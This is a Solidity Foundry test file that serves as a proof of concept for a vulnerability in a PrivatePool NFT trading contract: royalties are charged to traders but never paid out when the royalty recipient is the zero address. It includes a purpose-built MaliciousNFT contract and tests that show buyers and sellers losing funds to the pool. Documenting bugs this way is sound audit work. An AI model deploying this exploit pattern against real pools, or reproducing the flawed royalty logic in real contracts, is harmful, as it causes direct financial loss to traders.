// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../Fixture.sol";
import "../../src/PrivatePool.sol";

/**
 * @title ExploitTest - PoC for Royalty Fee Collection Without Distribution Vulnerability
 * @notice This test demonstrates a critical vulnerability where royalty fees are collected from traders
 *         but not distributed when the royalty recipient address is zero.
 *
 * VULNERABILITY DESCRIPTION:
 * The PrivatePool.buy() and PrivatePool.sell() functions have an inconsistency between royalty collection
 * and royalty distribution:
 *
 * 1. During royalty calculation, the code accumulates royaltyFeeAmount from _getRoyalty() without checking
 *    if the recipient address is valid (non-zero).
 * 2. The accumulated royaltyFeeAmount is added to the total amount charged to the buyer/seller.
 * 3. During royalty distribution, the code only transfers royalties if BOTH royaltyFee > 0 AND recipient != address(0).
 * 4. If _getRoyalty() returns a non-zero royaltyFee but a zero recipient address, the fee is collected
 *    from the trader but never distributed, causing direct loss of funds.
 *
 * ATTACK SCENARIO:
 * - A malicious or misconfigured NFT contract returns a non-zero royalty fee but address(0) as recipient
 * - Traders buying/selling these NFTs pay the royalty fee
 * - The royalty fee is never distributed to anyone
 * - The fee remains stuck in the pool contract, causing loss to traders
 *
 * IMPACT:
 * - Direct financial loss to traders (buyers and sellers)
 * - Funds become stuck in the pool contract
 * - High likelihood as pool creation is permissionless
 */
contract ExploitTest is Fixture {
    PrivatePool public privatePool;
    MaliciousNFT public maliciousNFT;

    address baseToken = address(0); // ETH
    uint128 virtualBaseTokenReserves = 100e18;
    uint128 virtualNftReserves = 5e18;
    uint16 feeRate = 0;
    uint56 changeFee = 0;
    bytes32 merkleRoot = bytes32(0);

    uint256[] tokenIds;
    uint256[] tokenWeights;
    PrivatePool.MerkleMultiProof proofs;

    address buyer = address(0x1234);
    address seller = address(0x5678);

    function setUp() public {
        // Deploy a malicious NFT that returns non-zero royalty fee but zero recipient address
        maliciousNFT = new MaliciousNFT();

        // Create and initialize the private pool with the malicious NFT
        privatePool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));
        privatePool.initialize(
            baseToken,
            address(maliciousNFT),
            virtualBaseTokenReserves,
            virtualNftReserves,
            changeFee,
            feeRate,
            merkleRoot,
            false, // useStolenNftOracle
            true   // payRoyalties - CRITICAL: royalties are enabled
        );

        // Mint NFTs to the pool for buying scenario
        for (uint256 i = 0; i < 5; i++) {
            maliciousNFT.mint(address(privatePool), i);
        }

        // Fund the buyer
        vm.deal(buyer, 1000e18);

        // Mint NFTs to seller for selling scenario
        for (uint256 i = 10; i < 15; i++) {
            maliciousNFT.mint(seller, i);
        }

        // Fund the pool with ETH for selling scenario
        vm.deal(address(privatePool), 1000e18);
    }

    /**
     * @notice Test demonstrating the vulnerability in the buy() function
     * @dev This test shows that:
     *      1. Buyer is charged for royalty fees
     *      2. Royalty fees are NOT distributed (recipient is address(0))
     *      3. Fees remain stuck in the pool contract
     *      4. Buyer loses funds equal to the royalty amount
     */
    function test_BuyRoyaltyFeeCollectedButNotDistributed() public {
        // Setup: Prepare to buy 3 NFTs
        tokenIds.push(1);
        tokenIds.push(2);
        tokenIds.push(3);

        // Calculate the quote (without royalties)
        (uint256 quoteAmount, uint256 feeAmount, uint256 protocolFeeAmount) = privatePool.buyQuote(tokenIds.length * 1e18);

        // Calculate the sale price per NFT (this is what royalty is based on)
        // From PrivatePool.sol line 236: salePrice = (netInputAmount - feeAmount - protocolFeeAmount) / tokenIds.length
        uint256 salePricePerNft = (quoteAmount - feeAmount - protocolFeeAmount) / tokenIds.length;

        // Calculate expected royalty (10% of sale price per NFT)
        uint256 expectedTotalRoyalty = (salePricePerNft * 10 / 100) * tokenIds.length;

        // Record balances before the buy
        uint256 buyerBalanceBefore = buyer.balance;
        uint256 poolBalanceBefore = address(privatePool).balance;

        // Execute the buy as the buyer
        vm.startPrank(buyer);

        // Send enough ETH to cover quote + royalties
        (uint256 actualNetInputAmount,,) = privatePool.buy{value: quoteAmount + expectedTotalRoyalty}(tokenIds, tokenWeights, proofs);
        vm.stopPrank();

        // VULNERABILITY PROOF:
        // 1. The returned netInputAmount includes the royalty fee
        assertEq(
            actualNetInputAmount,
            quoteAmount + expectedTotalRoyalty,
            "netInputAmount should include royalty fees"
        );

        // 2. Buyer was charged the full amount including royalties
        assertEq(
            buyerBalanceBefore - buyer.balance,
            actualNetInputAmount,
            "Buyer should be charged netInputAmount including royalties"
        );

        // 3. Royalty recipient (address(0)) received NOTHING (always 0)
        assertEq(address(0).balance, 0, "Royalty recipient receives nothing");

        // 4. CRITICAL: The pool received the full amount including royalty
        // The royalty fee is stuck in the pool instead of being distributed
        // Pool receives: actualNetInputAmount - protocolFeeAmount - royaltiesPaid
        // Since royalties are NOT paid (recipient is address(0)), pool keeps them
        assertEq(
            address(privatePool).balance - poolBalanceBefore,
            actualNetInputAmount - protocolFeeAmount,
            "Pool receives full amount including stuck royalties"
        );

        // 5. Calculate the stuck funds (buyer's loss)
        uint256 stuckFunds = actualNetInputAmount - quoteAmount;
        assertEq(stuckFunds, expectedTotalRoyalty, "Royalty fees stuck = buyer's loss");

        // Log the exploit details
        console.log("=== BUY EXPLOIT DEMONSTRATION ===");
        console.log("Buyer paid (including royalties):", actualNetInputAmount);
        console.log("Base cost (without royalties):", quoteAmount);
        console.log("Royalty fee collected:", expectedTotalRoyalty);
        console.log("Royalty fee distributed:", 0);
        console.log("Buyer's loss (stuck in pool):", stuckFunds);
        console.log("================================");

        // Verify the buyer actually received the NFTs
        assertEq(maliciousNFT.balanceOf(buyer), tokenIds.length, "Buyer should receive NFTs");
    }

    /**
     * @notice Test demonstrating the vulnerability in the sell() function
     * @dev This test shows that:
     *      1. Seller receives less funds (royalty deducted from output)
     *      2. Royalty fees are NOT distributed (recipient is address(0))
     *      3. Fees remain stuck in the pool contract
     *      4. Seller loses funds equal to the royalty amount
     */
    function test_SellRoyaltyFeeCollectedButNotDistributed() public {
        // Setup: Prepare to sell 3 NFTs
        uint256[] memory sellTokenIds = new uint256[](3);
        sellTokenIds[0] = 10;
        sellTokenIds[1] = 11;
        sellTokenIds[2] = 12;

        // Calculate the expected output without considering royalty deduction
        (uint256 netOutputBeforeRoyalty, uint256 feeAmount, uint256 protocolFeeAmount) =
            privatePool.sellQuote(sellTokenIds.length * 1e18);

        // Calculate expected royalty fee (10% of sale price per NFT)
        uint256 salePrice = (netOutputBeforeRoyalty + feeAmount + protocolFeeAmount) / sellTokenIds.length;
        uint256 expectedTotalRoyalty = (salePrice * 10 / 100) * sellTokenIds.length;

        // Record balances before the sell
        uint256 sellerBalanceBefore = seller.balance;

        // Approve the pool to transfer NFTs
        vm.startPrank(seller);
        for (uint256 i = 0; i < sellTokenIds.length; i++) {
            maliciousNFT.approve(address(privatePool), sellTokenIds[i]);
        }

        // Execute the sell
        IStolenNftOracle.Message[] memory stolenNftProofs = new IStolenNftOracle.Message[](0);
        (uint256 actualNetOutput,,) = privatePool.sell(
            sellTokenIds,
            tokenWeights,
            proofs,
            stolenNftProofs
        );
        vm.stopPrank();

        // VULNERABILITY PROOF:
        // 1. Seller received reduced amount (royalty deducted)
        assertEq(
            seller.balance - sellerBalanceBefore,
            actualNetOutput,
            "Seller should receive netOutputAmount with royalty deducted"
        );

        // 2. The returned netOutputAmount has royalty deducted
        assertEq(
            actualNetOutput,
            netOutputBeforeRoyalty - expectedTotalRoyalty,
            "netOutputAmount should have royalty deducted"
        );

        // 3. Royalty recipient (address(0)) received NOTHING (always 0)
        assertEq(address(0).balance, 0, "Royalty recipient should receive nothing");

        // 4. CRITICAL: The royalty fee is stuck in the pool contract
        uint256 stuckFunds = netOutputBeforeRoyalty - actualNetOutput;
        assertEq(stuckFunds, expectedTotalRoyalty, "Royalty fees stuck in pool = seller's loss");

        // Log the exploit details
        console.log("=== SELL EXPLOIT DEMONSTRATION ===");
        console.log("Seller received (after royalty deduction):", actualNetOutput);
        console.log("Expected output (without royalty):", netOutputBeforeRoyalty);
        console.log("Royalty fee deducted:", expectedTotalRoyalty);
        console.log("Royalty fee distributed:", 0);
        console.log("Seller's loss (stuck in pool):", stuckFunds);
        console.log("==================================");

        // Verify the pool actually received the NFTs
        assertEq(maliciousNFT.balanceOf(address(privatePool)), 5 + sellTokenIds.length, "Pool should receive NFTs");
    }

    /**
     * @notice Test to verify the vulnerability is fixed when recipient is non-zero
     * @dev This test shows that when recipient is valid, royalties are properly distributed
     */
    function test_RoyaltiesDistributedCorrectlyWithValidRecipient() public {
        // Deploy a properly configured NFT with valid royalty recipient
        ProperNFT properNFT = new ProperNFT();
        address royaltyRecipient = address(0xbeef);

        // Create a new pool with the proper NFT
        PrivatePool properPool = new PrivatePool(address(factory), address(royaltyRegistry), address(stolenNftOracle));
        properPool.initialize(
            baseToken,
            address(properNFT),
            virtualBaseTokenReserves,
            virtualNftReserves,
            changeFee,
            feeRate,
            merkleRoot,
            false,
            true // payRoyalties enabled
        );

        // Mint NFTs to the pool
        for (uint256 i = 0; i < 5; i++) {
            properNFT.mint(address(properPool), i);
        }

        // Setup buy
        uint256[] memory buyTokenIds = new uint256[](2);
        buyTokenIds[0] = 1;
        buyTokenIds[1] = 2;

        (uint256 netInputAmountWithoutRoyalties,,) = properPool.buyQuote(buyTokenIds.length * 1e18);
        uint256 salePricePerNft = netInputAmountWithoutRoyalties / buyTokenIds.length;
        uint256 expectedRoyaltyPerNft = salePricePerNft * 10 / 100;
        uint256 expectedTotalRoyalty = expectedRoyaltyPerNft * buyTokenIds.length;

        uint256 recipientBalanceBefore = royaltyRecipient.balance;

        // Execute buy
        vm.prank(buyer);
        uint256 totalCharged = netInputAmountWithoutRoyalties + expectedTotalRoyalty;
        properPool.buy{value: totalCharged}(buyTokenIds, tokenWeights, proofs);

        uint256 recipientBalanceAfter = royaltyRecipient.balance;

        // Verify royalties were properly distributed
        assertEq(
            recipientBalanceAfter - recipientBalanceBefore,
            expectedTotalRoyalty,
            "Royalty recipient should receive the full royalty amount"
        );

        console.log("=== PROPER ROYALTY DISTRIBUTION ===");
        console.log("Royalty fee collected:", expectedTotalRoyalty);
        console.log("Royalty fee distributed:", recipientBalanceAfter - recipientBalanceBefore);
        console.log("===================================");
    }
}

/**
 * @notice Malicious NFT contract that returns non-zero royalty fee but zero recipient address
 * @dev This simulates a misconfigured or malicious NFT contract that triggers the vulnerability
 */
contract MaliciousNFT is ERC721 {
    constructor() ERC721("Malicious NFT", "MAL") {}

    function tokenURI(uint256) public pure override returns (string memory) {
        return "https://malicious.nft";
    }

    function mint(address to, uint256 id) public {
        _mint(to, id);
    }

    function supportsInterface(bytes4 interfaceId) public view override returns (bool) {
        // Claim to support ERC2981 royalty standard
        return interfaceId == 0x2a55205a || super.supportsInterface(interfaceId);
    }

    /**
     * @notice Returns royalty info with ZERO recipient address but NON-ZERO royalty fee
     * @dev This is the key to triggering the vulnerability:
     *      - royaltyFee = 10% of sale price (non-zero)
     *      - recipient = address(0) (zero address)
     */
    function royaltyInfo(uint256, uint256 salePrice) public pure returns (address, uint256) {
        // Return 10% royalty fee but with address(0) as recipient
        return (address(0), salePrice * 10 / 100);
    }
}

/**
 * @notice Properly configured NFT contract with valid royalty recipient
 * @dev Used to demonstrate that the issue only occurs with zero recipient address
 */
contract ProperNFT is ERC721 {
    constructor() ERC721("Proper NFT", "PROP") {}

    function tokenURI(uint256) public pure override returns (string memory) {
        return "https://proper.nft";
    }

    function mint(address to, uint256 id) public {
        _mint(to, id);
    }

    function supportsInterface(bytes4 interfaceId) public view override returns (bool) {
        return interfaceId == 0x2a55205a || super.supportsInterface(interfaceId);
    }

    function royaltyInfo(uint256, uint256 salePrice) public pure returns (address, uint256) {
        // Return 10% royalty fee with valid recipient address
        return (address(0xbeef), salePrice * 10 / 100);
    }
}
